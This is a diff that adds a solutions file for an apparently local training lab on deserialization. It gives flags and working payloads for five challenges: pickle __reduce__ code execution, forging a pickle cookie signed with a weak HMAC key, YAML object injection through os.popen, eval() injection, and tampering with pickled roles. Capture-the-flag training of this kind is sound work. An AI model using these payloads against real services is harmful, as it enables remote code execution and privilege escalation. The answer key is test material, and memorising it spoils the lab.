@@ -1,0 +1,125 @@
+===============================================================================
+  NeonCache — Deserialization Lab Solutions (Port 5014)
+===============================================================================
+
+CHALLENGE 1: Pickle RCE
+Flag: FLAG{d3s3r14l_p1ckl3}
+
+  The /load endpoint base64-decodes input and passes it to pickle.loads().
+  Craft a malicious pickle with __reduce__ that executes a command:
+
+  python3 -c "
+  import pickle, base64, subprocess
+  class Exploit:
+      def __reduce__(self):
+          return (subprocess.check_output, (['cat', '/app/flag.txt'],))
+  print(base64.b64encode(pickle.dumps(Exploit())).decode())
+  "
+
+  Copy the base64 output and submit:
+  curl -X POST http://localhost:5014/load \
+    -d "data=<BASE64_PAYLOAD>"
+
+  The flag appears in the response as the deserialized object.
+
+  Visit /hint1 to see a sample safe pickle for reference.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Cookie Forgery — Weak HMAC Key
+Flag: FLAG{d3s3r14l_c00k1e_f0rg3}
+
+  The /dashboard reads a session_data cookie = base64(pickle) + "." + hmac.
+  The HMAC key is the weak string b'secret'.
+
+  Step 1: Visit /login to get the initial cookie (role='user').
+
+  Step 2: Forge an admin cookie:
+
+  python3 -c "
+  import pickle, base64, hmac, hashlib
+  session = {'username': 'admin', 'role': 'admin'}
+  data = base64.b64encode(pickle.dumps(session)).decode()
+  sig = hmac.new(b'secret', data.encode(), hashlib.sha256).hexdigest()
+  print(f'{data}.{sig}')
+  "
+
+  Step 3: Set the forged cookie and visit dashboard:
+  curl -b "session_data=<FORGED_COOKIE>" http://localhost:5014/dashboard
+
+  The dashboard shows the flag when role == 'admin'.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: YAML Object Injection
+Flag: FLAG{d3s3r14l_y4ml_0bj}
+
+  The /api/restore endpoint uses yaml.load() with UnsafeLoader.
+  Send a YAML payload that instantiates a Python object:
+
+  curl -X POST http://localhost:5014/api/restore \
+    -H "Content-Type: text/yaml" \
+    -d '!!python/object/apply:subprocess.check_output
+  args:
+    - ["cat", "/app/flag3.txt"]'
+
+  Alternative payload:
+  curl -X POST http://localhost:5014/api/restore \
+    -H "Content-Type: text/yaml" \
+    -d '!!python/object/apply:os.popen ["cat /app/flag3.txt"]'
+
+  The YAML unsafe loader instantiates the Python object during parsing.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: Custom Deserializer — eval() Injection
+Flag: FLAG{d3s3r14l_0bj_1nj3ct}
+
+  The /import-data endpoint accepts JSON with a __class__ field.
+  The custom deserializer calls eval(cls)(*args) and optionally
+  calls a method on the result.
+
+  curl -X POST http://localhost:5014/import-data \
+    -H "Content-Type: application/json" \
+    -d '{"__class__": "open", "args": ["/app/flag4.txt"], "method": "read"}'
+
+  This evaluates: open("/app/flag4.txt").read() → returns the flag.
+
+  Alternative (direct command execution):
+  curl -X POST http://localhost:5014/import-data \
+    -H "Content-Type: application/json" \
+    -d '{"__class__": "os.popen", "args": ["cat /app/flag4.txt"], "method": "read"}'
+
+  Note: "os.popen" may need "import os" first — check if the eval
+  context has os imported.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Pickle Data Tampering
+Flag: FLAG{d3s3r14l_t4mp3r}
+
+  Step 1: Export the user's pickle data:
+  curl http://localhost:5014/export?format=pickle
+  (Returns base64-encoded pickle of {username, role, credits})
+
+  Step 2: Decode, modify, and re-encode:
+
+  python3 -c "
+  import pickle, base64
+  # Paste the base64 from Step 1 here:
+  original = '<BASE64_FROM_EXPORT>'
+  obj = pickle.loads(base64.b64decode(original))
+  print('Original:', obj)
+  obj['role'] = 'admin'
+  obj['credits'] = 9999
+  tampered = base64.b64encode(pickle.dumps(obj)).decode()
+  print('Tampered:', tampered)
+  "
+
+  Step 3: Submit the tampered pickle:
+  curl -X POST http://localhost:5014/import-pickle \
+    -d "data=<TAMPERED_BASE64>"
+
+  The flag appears when role=='admin' and credits > 9000.
+
+===============================================================================
